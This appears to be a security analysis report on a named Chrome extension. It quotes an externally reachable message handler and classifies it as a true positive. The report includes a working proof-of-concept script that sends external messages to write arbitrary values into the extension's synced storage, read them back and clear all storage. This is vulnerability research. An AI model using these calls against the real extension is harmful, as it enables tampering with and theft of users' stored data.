# CoCo Analysis: nglfpieimpgnfelbomgkgegnehpjdiig

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (3 storage_sync_set, 1 storage_sync_clear, 3 sendResponseExternal)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nglfpieimpgnfelbomgkgegnehpjdiig/opgen_generated_files/bg.js
Line 981: `if (request.message) {`
Line 993: `} else if (request.set) {`
Line 994: `if (request.key) {`

**Code:**

```javascript
// Background script - Entry point (bg.js Line 974)
chrome.runtime.onMessageExternal.addListener(function (
  request,  // <- attacker-controlled
  sender,
  sendResponse
) {
  console.log("background script received a message");
  if (request) {
    if (request.message) {
      if (request.message == "screenshot") {
        chrome.tabs.captureVisibleTab(null, null, function(dataUrl) {
          sendResponse({ screenshot_url: dataUrl });
        });
      } else if (request.message == "extension_version") {
        sendResponse({ version: "1.0.0.5" });
        return true;
      } else if (request.message == "logout") {
        chrome.storage.sync.clear();  // Storage clear sink
        return true
      }
    } else if (request.set) {  // <- attacker-controlled
      if (request.key) {  // <- attacker-controlled
        storeValue(request.key, request[request.key]);  // <- attacker-controlled key and value
      }
      sendResponse({ message: "Updated successfully" });
      return true;
    } else if (request.get) {  // <- attacker can read storage
      if (request.values) {  // <- attacker-controlled
        getStoredValues(request.values, function (result) {
          result["message"] = "Values retrieved successfully";
          sendResponse(result);  // <- sends storage data back to attacker
        });
        return true;
      } else {
        sendResponse({ message: "No values sent" });
      }
    }
  }
  return true;
});

// Storage write function (Line 1058)
function storeValue(key, value) {
  chrome.storage.sync.set({ [key]: value }, function () {  // <- Storage write sink
  });
}

// Storage read function (Line 1063)
function getStoredValues(keys, handler) {
  chrome.storage.sync.get(keys, function (result) {  // <- Storage read source
    handler(result);
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via `chrome.runtime.onMessageExternal`

**Attack:**

```javascript
// From a whitelisted domain (platform.modernreliance.com or localhost:3000/3001)
// or from whitelisted extension IDs

// 1. Storage poisoning - write arbitrary data to storage
chrome.runtime.sendMessage(
  "nglfpieimpgnfelbomgkgegnehpjdiig",
  {
    set: true,
    key: "malicious_key",
    malicious_key: "attacker_controlled_value"
  },
  function(response) {
    console.log(response); // "Updated successfully"
  }
);

// 2. Storage retrieval - read stored data back
chrome.runtime.sendMessage(
  "nglfpieimpgnfelbomgkgegnehpjdiig",
  {
    get: true,
    values: ["malicious_key"]
  },
  function(response) {
    console.log(response); // { malicious_key: "attacker_controlled_value", message: "Values retrieved successfully" }
  }
);

// 3. Storage clear - delete all storage
chrome.runtime.sendMessage(
  "nglfpieimpgnfelbomgkgegnehpjdiig",
  {
    message: "logout"
  }
);
```

**Impact:** Complete storage exploitation chain. External attackers (from whitelisted domains or extension IDs specified in manifest's externally_connectable) can arbitrarily write data to chrome.storage.sync, read back all stored data including sensitive user information, and clear all storage. This allows full control over the extension's persistent data storage.
